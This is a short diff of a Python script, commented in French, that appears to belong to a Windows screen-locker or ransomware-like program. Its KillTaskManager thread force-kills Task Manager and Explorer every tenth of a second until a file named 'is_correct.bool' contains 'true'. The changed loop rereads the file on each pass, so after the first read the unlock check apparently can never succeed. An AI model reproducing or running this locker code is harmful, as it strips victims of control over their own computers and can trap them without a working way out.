@@ -8,10 +8,11 @@ def is_admin(): # Fonction pour vérifier si l'utilisateur est administrateur
 
 
 def KillTaskManager(): # Fonction pour kill le tskmngr et l'explorer
-    while True:
-        os.system("taskkill /F /IM Taskmgr.exe")
-        os.system("taskkill /F /IM explorer.exe")
-        time.sleep(0.1)
+    with open("is_correct.bool", "r") as bool:
+        while bool.read() != "true":
+            os.system("taskkill /F /IM Taskmgr.exe")
+            os.system("taskkill /F /IM explorer.exe")
+            time.sleep(0.1)
 
 
 killtskmng = threading.Thread(target=KillTaskManager) # Threads
